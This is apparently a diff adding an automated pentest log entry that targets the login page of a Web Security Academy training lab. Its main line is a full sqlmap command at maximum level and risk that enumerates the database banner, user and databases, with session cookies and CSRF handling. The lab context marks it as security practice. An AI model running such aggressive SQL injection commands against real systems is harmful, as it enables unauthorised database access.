@@ -1,0 +1,3 @@
+https://0a02006304d3117e8591c967007a001d.web-security-academy.net/login (POST)  # /usr/bin/sqlmap -u https://0a02006304d3117e8591c967007a001d.web-security-academy.net/login --output-dir=/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/Data/vuln_scan_20260325_090854/sqlmap_results --flush-session --fresh-queries --csrf-token=csrf --csrf-url=https://0a02006304d3117e8591c967007a001d.web-security-academy.net/login --force-ssl --threads=1 -o --batch --keep-alive --ignore-code=404 --random-agent --banner --current-db --current-user --dbs --level=5 --risk=3 --dbms=MySQL --technique=BETU --time-sec=5 --hex --data=csrf=FUZZ&username=&password= "--cookie=TrackingId=L93HwoVUafP1SHx8; session=gYftag124FejPqiNkE8JB4QzEH1P95XI"
+
+csrf=FUZZ&username=&password=
